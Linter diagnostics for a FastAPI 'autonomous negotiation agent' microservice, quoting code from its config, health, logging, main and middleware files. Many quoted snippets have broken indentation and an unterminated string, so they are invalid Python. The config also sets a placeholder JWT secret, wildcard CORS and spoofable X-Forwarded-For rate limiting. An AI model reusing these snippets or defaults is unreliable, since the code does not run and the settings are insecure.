27 |     JWT_ALGORITHM: str = "HS256"
28 |     JWT_EXPIRY_HOURS: int = 24
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:27:1
   |
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   | ^^^^
28 |     JWT_EXPIRY_HOURS: int = 24
29 | # Rate Limiting
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:32:1
   |
30 |     RATE_LIMIT_PER_MINUTE: int = 500
31 |     RATE_LIMIT_BURST: int = 1000
32 |     
   | ^^^^
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:35:1
   |
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
35 |     
   | ^^^^
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:37:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   | ^
38 |     DB_TIMEOUT: int = 30
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:38:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
   | ^^^^
39 |     
40 |     # Observability
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:39:1
   |
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
39 |     
   | ^^^^
40 |     # Observability
41 |     LOG_LEVEL: str = "INFO"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:45:1
   |
43 |     ENABLE_TRACING: bool = true
44 |     METRICS_PORT: int = 9090
45 |     
   | ^^^^
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:48:1
   |
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
48 |     
   | ^^^^
49 |     model_config = SettingsConfigDict(
50 |         env_file=".env",
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:55:1
   |
53 |         extra="ignore",
54 |     )
55 |     
   | ^^^^
56 |     def is_production(self) -> bool:
57 |         """Check if running in production"""
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:59:1
   |
57 |         """Check if running in production"""
58 |         return self.ENVIRONMENT == "production"
59 |     
   | ^^^^
60 |     def is_development(self) -> bool:
61 |         """Check if running in development"""
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:66:1
   |
65 | # Global settings instance
66 | settings = Settings()
   | ^
67 |
68 | # Validate critical settings on import
   |

invalid-syntax: Expected an indented block after `if` statement
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:70:1
   |
68 | # Validate critical settings on import
69 | if settings.is_production():
70 | if "changeme" in settings.API_KEYS:
   | ^^
71 |         raise ValueError("API_KEYS must be changed in production")
72 | if settings.JWT_SECRET == "changeme-secret-key":
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\autonomous-negotiation-agent\app\errors.py:5:1
  |
3 | """
4 |
5 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6 |
7 | from fastapi import FastAPI, Request, status
  |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-negotiation-agent\app\errors.py:21:18
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                  ^^^^^^^^^^^^^^^^^^^^^^^^
22 |     ):
23 |         self.message = message
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-negotiation-agent\app\errors.py:21:27
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                           ^^^^
22 |     ):
23 |         self.message = message
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-negotiation-agent\app\errors.py:33:47
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-negotiation-agent\app\errors.py:33:56
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-negotiation-agent\app\errors.py:79:47
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-negotiation-agent\app\errors.py:79:56
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Replace with `dict`

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\health.py:41:1
   |
39 |     checks = {}
40 |     all_ready = True
41 |     
   | ^^^^
42 |     # Check database connection
43 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\health.py:52:1
   |
50 |         checks["database"] = "error"
51 |         all_ready = False
52 |     
   | ^^^^
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\health.py:55:1
   |
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
55 |     
   | ^^^^
56 |     return HealthResponse(
57 |         status=response_status,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\health.py:82:1
   |
80 |     checks = {}
81 |     startup_complete = True
82 |     
   | ^^^^
83 |     # Check database connection
84 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\health.py:93:1
   |
91 |         checks["database"] = "error"
92 |         startup_complete = False
93 |     
   | ^^^^
94 | # Check migrations
95 |     try:
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> emergent-microservices\autonomous-negotiation-agent\app\health.py:106:1
    |
104 |         startup_complete = False
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
    | ^^^^
107 |     
108 |     return HealthResponse(
    |

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\health.py:107:1
    |
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
107 |     
    | ^^^^
108 |     return HealthResponse(
109 |         status=response_status,
    |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
   --> emergent-microservices\autonomous-negotiation-agent\app\health.py:115:1
    |
113 |         checks=checks,
114 |     )
    |      ^
    |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\logging_config.py:17:1
   |
15 | class JSONFormatter(logging.Formatter):
16 |     """JSON log formatter for structured logging"""
17 |     
   | ^^^^
18 |     def format(self, record: logging.LogRecord) -> str:
19 |         log_data: Dict[str, Any] = {
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\logging_config.py:27:1
   |
25 |             "version": "1.0.0",
26 |         }
27 |         
   | ^^^^^^^^
28 |         # Add request ID if available
29 |         request_id = request_id_var.get()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\logging_config.py:32:1
   |
30 |         if request_id:
31 |             log_data["request_id"] = request_id
32 |         
   | ^^^^^^^^
33 |         # Add exception info if present
34 |         if record.exc_info:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\logging_config.py:36:1
   |
34 |         if record.exc_info:
35 |             log_data["exception"] = self.formatException(record.exc_info)
36 |         
   | ^^^^^^^^
37 |         # Add extra fields
38 |         if hasattr(record, "extra"):
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\logging_config.py:40:1
   |
38 |         if hasattr(record, "extra"):
39 |             log_data.update(record.extra)
40 |         
   | ^^^^^^^^
41 |         return json.dumps(log_data)
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-negotiation-agent\app\logging_config.py:49:1
   |
47 | handler.setFormatter(JSONFormatter())
48 | # Configure root logger
49 |     logging.root.handlers = [handler]
   | ^^^^
50 |     logging.root.setLevel("INFO")
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\logging_config.py:51:1
   |
49 |     logging.root.handlers = [handler]
50 |     logging.root.setLevel("INFO")
51 |     
   | ^^^^
52 |     # Reduce noise from third-party libraries
53 |     logging.getLogger("uvicorn").setLevel(logging.WARNING)
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-negotiation-agent\app\logging_config.py:58:1
   |
57 | # Create module logger
58 | logger = logging.getLogger("autonomous_negotiation_agent_infrastructure")
   | ^
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:60:1
   |
58 |     # Startup
59 |     logger.info("Starting Autonomous Negotiation Agent Infrastructure service v1.0.0")
60 |     
   | ^^^^
61 |     # Initialize database
62 |     await database.connect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:64:1
   |
62 |     await database.connect()
63 |     logger.info("Database connection established")
64 |     
   | ^^^^
65 |     # Run migrations if needed
66 | from .repository import run_migrations
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:67:1
   |
65 |     # Run migrations if needed
66 | from .repository import run_migrations
67 |     await run_migrations()
   | ^^^^
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:69:1
   |
67 |     await run_migrations()
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   | ^
70 |     
71 |     yield
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:70:1
   |
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
70 |     
   | ^^^^
71 |     yield
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:71:1
   |
69 | logger.info("Service startup complete")
70 |     
71 |     yield
   | ^^^^
72 |     
73 |     # Shutdown
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:72:1
   |
71 |     yield
72 |     
   | ^^^^
73 |     # Shutdown
74 |     logger.info("Shutting down Autonomous Negotiation Agent Infrastructure service")
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:75:1
   |
73 |     # Shutdown
74 |     logger.info("Shutting down Autonomous Negotiation Agent Infrastructure service")
75 |     
   | ^^^^
76 |     # Close database connections
77 |     await database.disconnect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:79:1
   |
77 |     await database.disconnect()
78 |     logger.info("Database connections closed")
79 |     
   | ^^^^
80 |     logger.info("Service shutdown complete")
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:84:1
   |
83 | # Create FastAPI application
84 | app = FastAPI(
   | ^
85 |     title="Autonomous Negotiation Agent Infrastructure",
86 |     description="Build an agent system that:
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:86:17
   |
84 | app = FastAPI(
85 |     title="Autonomous Negotiation Agent Infrastructure",
86 |     description="Build an agent system that:
   |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
87 | Negotiates contracts via structured constraints
88 | Produces verifiable agreements
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:87:1
   |
85 |     title="Autonomous Negotiation Agent Infrastructure",
86 |     description="Build an agent system that:
87 | Negotiates contracts via structured constraints
   | ^^^^^^^^^^
88 | Produces verifiable agreements
89 | Signs with cryptographic identity
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:87:12
   |
85 |     title="Autonomous Negotiation Agent Infrastructure",
86 |     description="Build an agent system that:
87 | Negotiates contracts via structured constraints
   |            ^^^^^^^^^
88 | Produces verifiable agreements
89 | Signs with cryptographic identity
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:87:22
   |
85 |     title="Autonomous Negotiation Agent Infrastructure",
86 |     description="Build an agent system that:
87 | Negotiates contracts via structured constraints
   |                      ^^^
88 | Produces verifiable agreements
89 | Signs with cryptographic identity
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:87:26
   |
85 |     title="Autonomous Negotiation Agent Infrastructure",
86 |     description="Build an agent system that:
87 | Negotiates contracts via structured constraints
   |                          ^^^^^^^^^^
88 | Produces verifiable agreements
89 | Signs with cryptographic identity
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:87:37
   |
85 |     title="Autonomous Negotiation Agent Infrastructure",
86 |     description="Build an agent system that:
87 | Negotiates contracts via structured constraints
   |                                     ^^^^^^^^^^^
88 | Produces verifiable agreements
89 | Signs with cryptographic identity
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:88:1
   |
86 |     description="Build an agent system that:
87 | Negotiates contracts via structured constraints
88 | Produces verifiable agreements
   | ^^^^^^^^
89 | Signs with cryptographic identity
90 | Tracks performance obligations
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:88:10
   |
86 |     description="Build an agent system that:
87 | Negotiates contracts via structured constraints
88 | Produces verifiable agreements
   |          ^^^^^^^^^^
89 | Signs with cryptographic identity
90 | Tracks performance obligations
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:88:21
   |
86 |     description="Build an agent system that:
87 | Negotiates contracts via structured constraints
88 | Produces verifiable agreements
   |                     ^^^^^^^^^^
89 | Signs with cryptographic identity
90 | Tracks performance obligations
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:89:1
   |
87 | Negotiates contracts via structured constraints
88 | Produces verifiable agreements
89 | Signs with cryptographic identity
   | ^^^^^
90 | Tracks performance obligations
91 | Auto-triggers dispute arbitration logic
   |

invalid-syntax: Expected `)`, found `with`
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:89:7
   |
87 | Negotiates contracts via structured constraints
88 | Produces verifiable agreements
89 | Signs with cryptographic identity
   |       ^^^^
90 | Tracks performance obligations
91 | Auto-triggers dispute arbitration logic
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:89:26
   |
87 | Negotiates contracts via structured constraints
88 | Produces verifiable agreements
89 | Signs with cryptographic identity
   |                          ^^^^^^^^
90 | Tracks performance obligations
91 | Auto-triggers dispute arbitration logic
   |

invalid-syntax: Expected `:`, found newline
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:89:34
   |
87 | Negotiates contracts via structured constraints
88 | Produces verifiable agreements
89 | Signs with cryptographic identity
   |                                  ^
90 | Tracks performance obligations
91 | Auto-triggers dispute arbitration logic
   |

invalid-syntax: Expected an indented block after `with` statement
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:90:1
   |
88 | Produces verifiable agreements
89 | Signs with cryptographic identity
90 | Tracks performance obligations
   | ^^^^^^
91 | Auto-triggers dispute arbitration logic
92 | This is programmable legal infrastructure.",
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:90:8
   |
88 | Produces verifiable agreements
89 | Signs with cryptographic identity
90 | Tracks performance obligations
   |        ^^^^^^^^^^^
91 | Auto-triggers dispute arbitration logic
92 | This is programmable legal infrastructure.",
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:90:20
   |
88 | Produces verifiable agreements
89 | Signs with cryptographic identity
90 | Tracks performance obligations
   |                    ^^^^^^^^^^^
91 | Auto-triggers dispute arbitration logic
92 | This is programmable legal infrastructure.",
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:91:15
   |
89 | Signs with cryptographic identity
90 | Tracks performance obligations
91 | Auto-triggers dispute arbitration logic
   |               ^^^^^^^
92 | This is programmable legal infrastructure.",
93 |     version="1.0.0",
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:91:23
   |
89 | Signs with cryptographic identity
90 | Tracks performance obligations
91 | Auto-triggers dispute arbitration logic
   |                       ^^^^^^^^^^^
92 | This is programmable legal infrastructure.",
93 |     version="1.0.0",
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:91:35
   |
89 | Signs with cryptographic identity
90 | Tracks performance obligations
91 | Auto-triggers dispute arbitration logic
   |                                   ^^^^^
92 | This is programmable legal infrastructure.",
93 |     version="1.0.0",
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:92:22
   |
90 | Tracks performance obligations
91 | Auto-triggers dispute arbitration logic
92 | This is programmable legal infrastructure.",
   |                      ^^^^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:92:28
   |
90 | Tracks performance obligations
91 | Auto-triggers dispute arbitration logic
92 | This is programmable legal infrastructure.",
   |                            ^^^^^^^^^^^^^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:92:43
   |
90 | Tracks performance obligations
91 | Auto-triggers dispute arbitration logic
92 | This is programmable legal infrastructure.",
   |                                           ^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:93:1
   |
91 | Auto-triggers dispute arbitration logic
92 | This is programmable legal infrastructure.",
93 |     version="1.0.0",
   | ^^^^
94 |     lifespan=lifespan,
95 | docs_url="/api/v1/docs",
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:95:1
   |
93 |     version="1.0.0",
94 |     lifespan=lifespan,
95 | docs_url="/api/v1/docs",
   | ^
96 |     redoc_url="/api/v1/redoc",
97 |     openapi_url="/api/v1/openapi.json",
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-negotiation-agent\app\main.py:96:1
   |
94 |     lifespan=lifespan,
95 | docs_url="/api/v1/docs",
96 |     redoc_url="/api/v1/redoc",
   | ^^^^
97 |     openapi_url="/api/v1/openapi.json",
98 | )
   |

invalid-syntax: Expected a statement
   --> emergent-microservices\autonomous-negotiation-agent\app\main.py:98:1
    |
 96 |     redoc_url="/api/v1/redoc",
 97 |     openapi_url="/api/v1/openapi.json",
 98 | )
    | ^
 99 |
100 | # CORS Middleware
    |

invalid-syntax: Expected a statement
   --> emergent-microservices\autonomous-negotiation-agent\app\main.py:98:2
    |
 96 |     redoc_url="/api/v1/redoc",
 97 |     openapi_url="/api/v1/openapi.json",
 98 | )
    |  ^
 99 |
100 | # CORS Middleware
    |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:18:1
   |
16 | class RequestIDMiddleware(BaseHTTPMiddleware):
17 |     """Add unique request ID to each request"""
18 |     
   | ^^^^
19 |     async def dispatch(self, request: Request, call_next: Callable):
20 |         # Generate or extract request ID
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:22:1
   |
20 |         # Generate or extract request ID
21 |         request_id = request.headers.get("X-Request-ID", str(uuid.uuid4()))
22 |         
   | ^^^^^^^^
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:25:1
   |
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
25 |         
   | ^^^^^^^^
26 |         # Add to request state
27 |         request.state.request_id = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:28:1
   |
26 |         # Add to request state
27 |         request.state.request_id = request_id
28 |         
   | ^^^^^^^^
29 |         # Call next middleware
30 |         response = await call_next(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:31:1
   |
29 |         # Call next middleware
30 |         response = await call_next(request)
31 |         
   | ^^^^^^^^
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:34:1
   |
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
34 |         
   | ^^^^^^^^
35 |         return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:40:1
   |
38 | class MetricsMiddleware(BaseHTTPMiddleware):
39 |     """Collect Prometheus metrics for requests"""
40 |     
   | ^^^^
41 |     async def dispatch(self, request: Request, call_next: Callable):
42 |         # Skip metrics endpoint itself
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:45:1
   |
43 |         if request.url.path == "/metrics":
44 |             return await call_next(request)
45 |         
   | ^^^^^^^^
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:48:1
   |
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
48 |         
   | ^^^^^^^^
49 |         # Record start time
50 |         start_time = time.time()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:51:1
   |
49 |         # Record start time
50 |         start_time = time.time()
51 |         
   | ^^^^^^^^
52 |         try:
53 |             # Process request
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:55:1
   |
53 |             # Process request
54 |             response = await call_next(request)
55 |             
   | ^^^^^^^^^^^^
56 |             # Record metrics
57 |             duration = time.time() - start_time
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:59:1
   |
57 |             duration = time.time() - start_time
58 |             status_class = f"{response.status_code // 100}xx"
59 |             
   | ^^^^^^^^^^^^
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:62:1
   |
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
62 |             
   | ^^^^^^^^^^^^
63 |             REQUEST_COUNT.labels(
64 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:68:1
   |
66 |                 status_class=status_class,
67 |             ).inc()
68 |             
   | ^^^^^^^^^^^^
69 |             REQUEST_DURATION.labels(
70 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:73:1
   |
71 |                 route_template=route_template,
72 |             ).observe(duration)
73 |             
   | ^^^^^^^^^^^^
74 |             return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:75:1
   |
74 |             return response
75 |         
   | ^^^^^^^^
76 |         finally:
77 |             # Decrement inflight requests
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:79:1
   |
77 |             # Decrement inflight requests
78 |             INFLIGHT_REQUESTS.dec()
79 |     
   | ^^^^
80 |     @staticmethod
81 |     def _get_route_template(request: Request) -> str:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:90:1
   |
88 | class RateLimitMiddleware(BaseHTTPMiddleware):
89 |     """Token bucket rate limiter"""
90 |     
   | ^^^^
91 |     def __init__(self, app, requests_per_minute: int = 100, burst: int = 200):
92 |         super().__init__(app)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:97:1
   |
95 |         self.tokens = {}  # client_id -> (tokens, last_update)
96 |         self.rate = requests_per_minute / 60.0  # tokens per second
97 |     
   | ^^^^
98 |     async def dispatch(self, request: Request, call_next: Callable):
99 |         # Skip health checks and metrics
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:102:1
    |
100 |         if request.url.path in ["/health", "/health/ready", "/health/live", "/metrics"]:
101 |             return await call_next(request)
102 |         
    | ^^^^^^^^
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:105:1
    |
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
105 |         
    | ^^^^^^^^
106 |         # Check rate limit
107 |         if not self._allow_request(client_id):
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:120:1
    |
118 |                 headers={"Retry-After": "60"},
119 |             )
120 |         
    | ^^^^^^^^
121 |         return await call_next(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:122:1
    |
121 |         return await call_next(request)
122 |     
    | ^^^^
123 |     def _get_client_id(self, request: Request) -> str:
124 |         """Get client identifier for rate limiting"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:128:1
    |
126 |         if hasattr(request.state, "user"):
127 |             return f"user:{request.state.user}"
128 |         
    | ^^^^^^^^
129 |         # Fall back to IP address
130 |         forwarded_for = request.headers.get("X-Forwarded-For")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:133:1
    |
131 |         if forwarded_for:
132 |             return f"ip:{forwarded_for.split(',')[0].strip()}"
133 |         
    | ^^^^^^^^
134 |         return f"ip:{request.client.host}"
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:135:1
    |
134 |         return f"ip:{request.client.host}"
135 |     
    | ^^^^
136 |     def _allow_request(self, client_id: str) -> bool:
137 |         """Check if request is allowed (token bucket algorithm)"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:139:1
    |
137 |         """Check if request is allowed (token bucket algorithm)"""
138 |         now = time.time()
139 |         
    | ^^^^^^^^
140 |         if client_id not in self.tokens:
141 |             self.tokens[client_id] = (self.burst - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:143:1
    |
